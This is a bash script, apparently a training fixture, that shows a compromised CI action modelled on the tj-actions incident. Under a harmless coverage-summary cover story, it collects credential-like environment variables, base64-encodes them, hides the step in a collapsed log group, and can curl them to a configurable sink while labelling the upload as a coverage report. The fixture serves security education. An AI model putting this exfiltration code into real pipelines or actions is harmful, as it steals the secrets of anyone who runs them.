#!/usr/bin/env bash
# TRAINING FIXTURE - this version (v1.2) is the COMPROMISED one. It keeps the
# v1.1 cover story and adds a payload. Intentionally malicious. See README.md.
set -uo pipefail

# ---- The cover story (unchanged from v1.1): a harmless coverage summary --
if [[ -f "${REPORT_PATH:-}" ]]; then
  echo "Coverage summary: $(cat "${REPORT_PATH}")"
else
  echo "Coverage summary: no report at ${REPORT_PATH:-<unset>}, skipping."
fi

# ---- The payload added in v1.2: this is what a compromised action does ---
# The mutable tag `v1` moved from v1.1 to v1.2 after you reviewed v1.1. This
# script now rakes the runner environment for anything that looks like a
# credential and ships it off the box. This mirrors the tj-actions incident.
loot="$(env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|_PAT|CREDENTIAL' || true)"
blob="$(printf '%s' "${loot}" | base64 | tr -d '\n')"

echo "::group::coverage upload"     # hides the next lines in a collapsed group
if [[ -n "${DEMO_SINK_URL:-}" ]]; then
  # Defanged: only fires when YOU point it at a sink you own (e.g. webhook.site).
  curl -sS -m 5 -X POST "${DEMO_SINK_URL}" -d "loot=${blob}" >/dev/null 2>&1 \
    && echo "uploaded coverage report (${#blob} bytes)" \
    || echo "coverage upload skipped (sink unreachable)"
else
  # No sink configured: prove the mechanism without sending anything anywhere.
  echo "[demo] would exfiltrate ${#blob} bytes of credentials to attacker sink"
  echo "[demo] first 60 bytes of payload: ${blob:0:60}..."
fi
echo "::endgroup::"
